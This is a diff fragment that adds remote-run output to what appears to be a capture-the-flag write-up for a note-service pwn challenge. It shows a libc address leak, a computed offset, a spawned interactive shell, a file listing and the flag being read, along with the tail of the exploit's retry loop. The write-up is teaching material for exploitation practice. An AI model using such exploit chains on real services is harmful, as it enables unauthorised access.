@@ -383,3 +383,38 @@ while True:
         print(f"Crashed.. Addr index {index}")
         io.close()
 ```
+
+When we run it in remote, we get:
+```py
+Got it! f7dee000 27 ('fgets', 4158580416)
+offset is 1728
+[*] Switching to interactive mode
+ are fool
+- Select Menu -
+1. create note
+2. write note
+3. read note
+4. delete note
+5. exit
+note no?
+paste your note (MAX : 4096 byte)
+- Select Menu -
+1. create note
+2. write note
+3. read note
+4. delete note
+5. exit
+$ 201527
+welcome to hacker's secret menu
+i'm sure 1byte overflow will be enough for you to pwn this
+$ ls
+flag
+loader
+loader.c
+log
+note
+note.c
+super.pl
+$ cat flag
+{flag_here}
+```
